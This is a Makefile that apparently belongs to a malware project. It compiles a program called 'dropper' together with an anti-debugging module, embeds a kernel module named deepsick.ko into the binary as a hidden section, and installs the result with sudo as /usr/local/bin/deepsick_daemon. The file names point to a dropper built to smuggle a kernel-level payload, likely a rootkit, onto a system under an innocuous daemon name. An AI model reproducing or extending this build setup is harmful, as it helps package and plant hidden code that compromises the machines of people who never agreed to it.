# User dropper Makefile
CC = gcc
CFLAGS = -O2 -Wall -Wextra -fPIE -pie -D_FORTIFY_SOURCE=2
LDFLAGS = -lcrypto -ldl -Wl,-z,now,-z,relro

SRCS = dropper.c anti_debug.c
OBJS = $(SRCS:.c=.o)
EXEC = dropper

all: $(EXEC)

$(EXEC): $(OBJS)
	$(CC) $(CFLAGS) $^ -o $@ $(LDFLAGS)
	objcopy --add-section .module=../kernel/deepsick.ko $@

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

clean:
	rm -f $(EXEC) $(OBJS)

install: $(EXEC)
	sudo cp $(EXEC) /usr/local/bin/deepsick_daemon
	